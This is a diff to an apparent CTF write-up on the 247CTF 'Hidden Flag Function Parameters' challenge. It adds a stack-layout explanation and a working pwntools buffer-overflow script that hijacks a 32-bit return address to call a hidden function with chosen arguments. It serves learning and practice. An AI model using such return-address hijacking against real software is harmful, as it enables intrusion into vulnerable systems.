@@ -1,6 +1,6 @@
 ---
 title: "247CTF - Hidden Flag Function Parameters"
-date: 2021-02-28
+date: 2021-03-04
 categories: [247ctf, ctf]
 image: /images/247ctf/pwnable/hidden_flag_function_parameters/stack_behavior_while_hijacking_exploiting.png
 tags: [247ctf, assembly, ctf, tutorial, walkthrough, debug, reverse engineering, exploiting, pwn, binary exploitation, hidden flag function parameters, buffer overflow]
@@ -104,10 +104,48 @@ Now, with this in mind we know so far that our exploit should meet, at least, th
 
 With all this information in mind, the scheme of our exploit is the one I drew in the next image.
 
-Notice I depicted the state of the stack and the registers when `chall` is about to finish (execute `ret`) and right after `flag` epilogue. If there is something you don't understand (like how the registers work or why do they move) do not hesitate to reach me out!
-
 <p align="center">
 	<img src="/images/247ctf/pwnable/hidden_flag_function_parameters/stack_behavior_while_hijacking_exploiting.png">
+</p>
+
+Notice I depicted the state of the stack and the registers when `chall` is about to finish (execute `ret`) and right after `flag` epilogue. If there is something you don't understand (like how the registers work or why do they move) do not hesitate to reach me out!
+
+The logic behind the previous scheme is: in the left side of the image you can see the stack's composition when `chall` is about to finish (calling `ret`). In order to reach `flag` we must overwrite `chall`'s return address. We must write 0x84 padding bytes to reach `ebp-0x4`, write `ebx`'s expected value (remember we are working with 32-bit little endian), another 0x4 bytes of padding to reach the return address and, finally, the address of `flag`. We must continue writing data into memory so we accordingly set the parameters of `flag`. And here is where is most useful the drawing of the stack from `flag`'s perspective (right side of the image).
+
+Please be aware of the cell separation that exists between `ebp` and `flag`'s first argument (even though this memory cell corresponds to what would have been `flag`'s return address, we couldn't care less about it at this point). This is how `flag` expects the stack to be set-up and we must respect it. This cell separation must be considered when overflowing `chall`'s buffer.
+
+After all this reasoning, the script that I used and successfully exploits the binary is the following one. __BEAR IN MIND__ you can test your exploit locally by creating a spurious _flag.txt_.
+
+```python
+# RazviOverflow
+# Python3
+
+from pwn import *
+
+flag_address = 0x08048576
+ebx_original_value = 0x0804a000
+arg1 = 0x1337
+arg2 = 0x247
+arg3 = 0x12345678
+payload = b"A"*0x84 + p32(ebx_original_value) + b"B"*0x4 + p32(flag_address) + b"C"*0x4 + p32(arg1) + p32(arg2) + p32(arg3)
+
+binary = process("./hidden_flag_function_with_args")
+#binary = remote("XXX", 00000)
+print(binary.recv())
+binary.sendline(payload)
+binary.interactive()
+```
+
+Executing the exploit successfully leaks the flag. _The execution ends with errors, but we do not care about a clean execution. We have the flag :)_
+
+<p align="center">
+	<img src="/images/247ctf/pwnable/hidden_flag_function_parameters/exploited_locally.png">
+</p>
+
+Now, executing it remotely should leak the actual flag to validate the challenge.
+
+<p align="center">
+	<img src="/images/247ctf/pwnable/hidden_flag_function_parameters/exploited_remotely.png">
 </p>
 
 I hope you enjoyed my write-up. I'd be delighted to know whether it helped you progress and learn new things. Do not hesitate to reach me out via [Twitter](https://twitter.com/Razvieu). I'm always eager to learn new things and help others out :)
